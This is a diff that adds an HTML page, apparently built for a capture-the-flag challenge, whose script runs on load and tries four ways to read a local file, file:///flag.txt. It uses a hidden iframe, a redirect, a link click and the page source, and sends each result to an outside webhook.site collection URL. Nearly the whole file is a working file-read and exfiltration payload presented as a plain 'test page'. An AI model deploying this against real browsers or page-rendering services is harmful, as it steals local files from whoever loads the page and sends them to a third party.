@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<script>
+function sendResult(method, result, isError = false) {
+    const param = isError ? 'error' : 'result';
+    fetch(`https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?method=${method}&${param}=` + encodeURIComponent(result));
+}
+
+// Method 1: Try iframe with file URI
+function tryIframe() {
+    try {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'file:///flag.txt';
+        iframe.style.display = 'none';
+        iframe.onload = function() {
+            try {
+                const content = iframe.contentDocument.body.innerText;
+                sendResult('iframe', content);
+            } catch (e) {
+                sendResult('iframe', e.message, true);
+            }
+        };
+        iframe.onerror = function() {
+            sendResult('iframe', 'iframe_load_error', true);
+        };
+        document.body.appendChild(iframe);
+    } catch (e) {
+        sendResult('iframe', e.message, true);
+    }
+}
+
+// Method 2: Try reading current page source (in case flag is embedded)
+function tryPageSource() {
+    try {
+        sendResult('page_source', document.documentElement.outerHTML);
+    } catch (e) {
+        sendResult('page_source', e.message, true);
+    }
+}
+
+// Method 3: Try location redirect to file
+function tryLocationRedirect() {
+    setTimeout(() => {
+        try {
+            window.location = 'file:///flag.txt';
+        } catch (e) {
+            sendResult('location_redirect', e.message, true);
+        }
+    }, 2000);
+}
+
+// Method 4: Try creating a link and clicking it
+function tryLinkClick() {
+    try {
+        const link = document.createElement('a');
+        link.href = 'file:///flag.txt';
+        link.target = '_blank';
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        link.click();
+        sendResult('link_click', 'attempted');
+    } catch (e) {
+        sendResult('link_click', e.message, true);
+    }
+}
+
+// Execute all methods
+setTimeout(() => {
+    sendResult('info', 'Starting multi-approach test');
+    tryPageSource();
+    tryIframe();
+    tryLinkClick();
+    tryLocationRedirect(); // This one last as it might redirect the page
+}, 1000);
+</script>
+<body>
+<p>Multi-approach test page</p>
+</body>
+</html>
